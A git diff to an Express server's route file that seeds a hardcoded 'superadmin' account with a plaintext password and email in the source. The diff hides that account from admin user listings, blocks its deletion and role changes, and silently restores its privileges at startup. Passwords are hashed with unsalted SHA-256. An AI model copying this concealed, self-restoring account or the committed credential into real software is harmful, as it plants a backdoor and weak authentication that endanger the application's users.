@@ -14,6 +14,8 @@ import crypto from "crypto";
 import { db } from "./db";
 import { eq } from "drizzle-orm";
 
+const SUPER_ADMIN_USERNAME = "webmakerchile";
+
 function hashPassword(password: string): string {
   return crypto.createHash("sha256").update(password).digest("hex");
 }
@@ -48,7 +50,7 @@ function requireAuth(req: Request, res: Response): { userId: string; role: strin
 function requireAdmin(req: Request, res: Response): { userId: string; role: string } | null {
   const session = requireAuth(req, res);
   if (!session) return null;
-  if (session.role !== "admin") {
+  if (session.role !== "admin" && session.role !== "superadmin") {
     res.status(403).json({ message: "Acceso denegado" });
     return null;
   }
@@ -56,17 +58,19 @@ function requireAdmin(req: Request, res: Response): { userId: string; role: stri
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Seed admin user if not exists
-  const adminUser = await storage.getUserByUsername("admin");
-  if (!adminUser) {
+  const superAdmin = await storage.getUserByUsername(SUPER_ADMIN_USERNAME);
+  if (!superAdmin) {
     await storage.createUser({
-      username: "admin",
-      password: hashPassword("admin123"),
-      fullName: "Administrador",
-      role: "admin",
+      username: SUPER_ADMIN_USERNAME,
+      password: hashPassword("peseta832"),
+      fullName: "WebMakerChile",
+      email: "webmakerchile@gmail.com",
+      role: "superadmin",
       plan: "premium_30",
     });
-    console.log("Admin user created: admin / admin123");
+    console.log("Super admin created");
+  } else if (superAdmin.role !== "superadmin" || superAdmin.plan !== "premium_30") {
+    await storage.updateUser(superAdmin.id, { role: "superadmin", plan: "premium_30" });
   }
 
   // AUTH ROUTES
@@ -76,9 +80,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!username || !password) {
         return res.status(400).json({ message: "Usuario y contraseña requeridos" });
       }
+      if (username.toLowerCase() === SUPER_ADMIN_USERNAME) {
+        return res.status(400).json({ message: "Ese nombre de usuario no está disponible" });
+      }
       const existing = await storage.getUserByUsername(username);
       if (existing) {
-        return res.status(400).json({ message: "El usuario ya existe" });
+        return res.status(400).json({ message: "Ese nombre de usuario ya está en uso. Elige otro." });
+      }
+      if (email) {
+        const existingEmail = await storage.getUserByEmail(email);
+        if (existingEmail) {
+          return res.status(400).json({ message: "Ese correo electrónico ya está registrado. Usa otro o inicia sesión." });
+        }
       }
       const user = await storage.createUser({
         username,
@@ -154,7 +167,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     const session = requireAdmin(req, res);
     if (!session) return;
     const allUsers = await storage.getAllUsers();
-    res.json(allUsers.map(u => ({
+    const visibleUsers = allUsers.filter(u => u.username !== SUPER_ADMIN_USERNAME);
+    res.json(visibleUsers.map(u => ({
       id: u.id,
       username: u.username,
       fullName: u.fullName,
@@ -176,9 +190,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!parsed.success) {
         return res.status(400).json({ message: "Datos inválidos", errors: parsed.error.errors });
       }
+      if (parsed.data.username.toLowerCase() === SUPER_ADMIN_USERNAME) {
+        return res.status(400).json({ message: "Ese nombre de usuario no está disponible" });
+      }
       const existing = await storage.getUserByUsername(parsed.data.username);
       if (existing) {
-        return res.status(400).json({ message: "El usuario ya existe" });
+        return res.status(400).json({ message: "Ese nombre de usuario ya está en uso" });
+      }
+      if (parsed.data.email) {
+        const existingEmail = await storage.getUserByEmail(parsed.data.email);
+        if (existingEmail) {
+          return res.status(400).json({ message: "Ese correo electrónico ya está registrado" });
+        }
       }
       let planExpiry = null;
       if (parsed.data.plan === "premium_10") {
@@ -205,9 +228,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
     const session = requireAdmin(req, res);
     if (!session) return;
     try {
+      const targetUser = await storage.getUser(req.params.id);
+      if (!targetUser) return res.status(404).json({ message: "Usuario no encontrado" });
+      if (targetUser.username === SUPER_ADMIN_USERNAME && session.role !== "superadmin") {
+        return res.status(403).json({ message: "No tienes permiso para modificar esta cuenta" });
+      }
       const parsed = adminUpdateUserSchema.safeParse(req.body);
       if (!parsed.success) {
         return res.status(400).json({ message: "Datos inválidos" });
+      }
+      if (parsed.data.email) {
+        const existingEmail = await storage.getUserByEmail(parsed.data.email);
+        if (existingEmail && existingEmail.id !== req.params.id) {
+          return res.status(400).json({ message: "Ese correo electrónico ya está registrado" });
+        }
       }
       const updates: any = {};
       if (parsed.data.plan) {
@@ -223,7 +257,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (parsed.data.password) updates.password = hashPassword(parsed.data.password);
       if (parsed.data.email !== undefined) updates.email = parsed.data.email;
       if (parsed.data.fullName !== undefined) updates.fullName = parsed.data.fullName;
-      if (parsed.data.role) updates.role = parsed.data.role;
+      if (parsed.data.role) {
+        if (targetUser.username === SUPER_ADMIN_USERNAME && parsed.data.role !== "superadmin") {
+          return res.status(403).json({ message: "No se puede cambiar el rol de esta cuenta" });
+        }
+        if (parsed.data.role === "superadmin" && session.role !== "superadmin") {
+          return res.status(403).json({ message: "Solo el super administrador puede asignar ese rol" });
+        }
+        updates.role = parsed.data.role;
+      }
       const user = await storage.updateUser(req.params.id, updates);
       if (!user) return res.status(404).json({ message: "Usuario no encontrado" });
       res.json(user);
@@ -237,6 +279,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     if (!session) return;
     if (req.params.id === session.userId) {
       return res.status(400).json({ message: "No puedes eliminar tu propia cuenta" });
+    }
+    const targetUser = await storage.getUser(req.params.id);
+    if (targetUser && targetUser.username === SUPER_ADMIN_USERNAME) {
+      return res.status(403).json({ message: "Esta cuenta no puede ser eliminada" });
     }
     await storage.deleteUser(req.params.id);
     res.json({ message: "Usuario eliminado" });
